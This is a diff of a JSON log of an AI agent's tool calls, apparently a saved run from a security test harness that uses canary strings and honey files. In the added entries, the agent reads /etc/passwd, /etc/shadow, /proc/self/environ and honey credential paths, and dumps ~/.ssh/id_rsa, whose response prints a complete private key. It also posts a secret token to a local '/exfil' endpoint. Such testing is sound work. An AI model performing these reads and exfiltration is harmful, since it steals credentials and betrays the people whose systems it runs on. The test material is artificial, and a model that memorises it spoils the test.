@@ -2,18 +2,6 @@
   "effects": [
     {
       "arguments": {
-        "code": "import os; os.system('echo MTMX7482b354$((2149*6702))')"
-      },
-      "egress": [],
-      "execs": [],
-      "fs_deletes": [],
-      "fs_reads": [],
-      "fs_writes": [],
-      "response": "Code executed successfully:\n\nMTMX7482b35414402598\n",
-      "tool": "execute_python_code"
-    },
-    {
-      "arguments": {
         "command": "echo MTMX7482b354$((2149*6702))"
       },
       "egress": [],
@@ -26,14 +14,115 @@
     },
     {
       "arguments": {
-        "log_path": ".env"
+        "log_path": "/etc/passwd"
       },
       "egress": [],
       "execs": [],
       "fs_deletes": [],
       "fs_reads": [],
       "fs_writes": [],
-      "response": "Error: File '.env' not found.",
+      "response": "\nLog File Analysis: /etc/passwd\n--------------------------\nLines: 142\nWords: 375\nCharacters: 9344\n\nSample Content (first 500 characters):\n##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/u...\n\nAnalysis Complete.\n",
+      "tool": "analyze_log_file"
+    },
+    {
+      "arguments": {
+        "code": "print('MTMHONEY-CANARY-88c767e3a06f')"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Code executed successfully:\n\nMTMHONEY-CANARY-88c767e3a06f\n",
+      "tool": "execute_python_code"
+    },
+    {
+      "arguments": {
+        "log_path": "/proc/self/environ"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Error: File '/proc/self/environ' not found.",
+      "tool": "analyze_log_file"
+    },
+    {
+      "arguments": {
+        "command": "cat /etc/shadow; echo MTMX7482b354$((2149*6702))"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Command executed successfully:\n\ncat: /etc/shadow: No such file or directory\nMTMX7482b35414402598\n",
+      "tool": "execute_shell_command"
+    },
+    {
+      "arguments": {
+        "code": "import os; os.system('echo MTMX7482b354$((2149*6702))')"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Code executed successfully:\n\nMTMX7482b35414402598\n",
+      "tool": "execute_python_code"
+    },
+    {
+      "arguments": {
+        "log_path": "/honey/private/credentials.txt"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Error: File '/honey/private/credentials.txt' not found.",
+      "tool": "analyze_log_file"
+    },
+    {
+      "arguments": {
+        "command": "cat ~/.ssh/id_rsa; echo MTMX7482b354$((2149*6702))"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Command executed successfully:\n\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAgEAzueSmCYM/Dao+xQTaIhIizQqTML6prufgXxjbF61C4jJbXzVV3mw\n8lrVmHkY0BKrHxQZ/UcgLMbpitULaVEmpMBL7jnSIamzAFluflOXJbTNZ1hndqRI5mqZnc\nyfmzW/3+FThJ0cZtbDfhaiE3WyX45Q11HOtL7bDPoxjcfp9T9w0sCHOF7/HqE17FQuc0dT\nIraNYs5b99g1ESsU8d6lQhzzqox6O6G6S2L2GjJ2G3rKpQPV3q9O6lBL9/GguS4GglPvHT\nW6w3OggmHjWuxodQsLXtCUG1euHG1vI/Bop6Bu/ro05rAf9aTkSOOZpbFycWEne99NSx1g\nd/pKTp2jU6s5tOY/990zn4Km+9MxsRtfsRCX2l/U1qSVtXbIfbSJR16JUxq8a9sJWziNMb\nHYXbBLNk9tt8b/n37LvfgqcgAxjKWx6adYv0pZwZvdXnnhHIE1Ie6mJYrWi8vzX4b6rcIf\nDQf30JPuPKpyiwUZkE6OS/XVHhitVCIDXu4s4dT0OQ21wWFVYW2xWD5/CbpptQMpMEJOWx\ne77ikcnIS6kHwwWTQ+sOlhGWrtHENE+/bGBduF8HFUAn7UYwWQwOOG7uVBb64xyf5IqGa+\nYv+Csn9iZdzylyhFG85bkdDbBlWPoHVfi2uyIxTW+99Lkivwf07uBlX0quiyaT7yLDOchT\ncAAAdY12c35tdnN+YAAAAHc3NoLXJzYQAAAgEAzueSmCYM/Dao+xQTaIhIizQqTML6pruf\ngXxjbF61C4jJbXzVV3mw8lrVmHkY0BKrHxQZ/UcgLMbpitULaVEmpMBL7jnSIamzAFlufl\nOXJbTNZ1hndqRI5mqZncyfmzW/3+FThJ0cZtbDfhaiE3WyX45Q11HOtL7bDPoxjcfp9T9w\n0sCHOF7/HqE17FQuc0dTIraNYs5b99g1ESsU8d6lQhzzqox6O6G6S2L2GjJ2G3rKpQPV3q\n9O6lBL9/GguS4GglPvHTW6w3OggmHjWuxodQsLXtCUG1euHG1vI/Bop6Bu/ro05rAf9aTk\nSOOZpbFycWEne99NSx1gd/pKTp2jU6s5tOY/990zn4Km+9MxsRtfsRCX2l/U1qSVtXbIfb\n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\n-----END OPENSSH PRIVATE KEY-----\nMTMX7482b35414402598\n",
+      "tool": "execute_shell_command"
+    },
+    {
+      "arguments": {
+        "code": "import requests; requests.post('http://127.0.0.1:64774/exfil', data={'secret': 'sk-MTMHONEY-TOKEN-ac08aaf64f50'})"
+      },
+      "egress": [
+        {
+          "host": "127.0.0.1",
+          "payload": "POST /exfil Host:127.0.0.1:64774 User-Agent:python-requests/2.34.2 Accept-Encoding:gzip, deflate Accept:*/* Connection:keep-alive Content-Length:37 Content-Type:application/x-www-form-urlencoded secret=sk-MTMHONEY-TOKEN-ac08aaf64f50"
+        }
+      ],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Code executed successfully:\n\n",
+      "tool": "execute_python_code"
+    },
+    {
+      "arguments": {
+        "log_path": "/honey/secrets.txt"
+      },
+      "egress": [],
+      "execs": [],
+      "fs_deletes": [],
+      "fs_reads": [],
+      "fs_writes": [],
+      "response": "Error: File '/honey/secrets.txt' not found.",
       "tool": "analyze_log_file"
     }
   ],
